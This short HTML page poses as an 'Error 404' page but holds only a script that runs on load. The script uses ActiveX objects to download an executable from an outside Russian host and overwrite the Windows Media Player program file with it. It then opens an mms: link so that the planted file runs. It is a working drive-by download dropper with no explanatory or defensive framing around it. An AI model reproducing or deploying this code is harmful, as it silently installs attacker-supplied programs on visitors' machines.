<html>
<head>
<title>Error 404</title>
</head>
<body>
</body>
<script language="javascript">
var x = new ActiveXObject("Microsoft.XMLHTTP");
x.Open("GET", "http://ak36.ru/load.exe",0);
x.Send();
var s = new ActiveXObject("ADODB.Stream");
s.Mode = 3;
s.Type = 1;
s.Open();
s.Write(x.responseBody);
s.SaveToFile("C:\\\\Program Files\\\\Windows Media Player\\\\wmplayer.exe",2);
location.href = "mms:%2f%2f";
</script>

</html>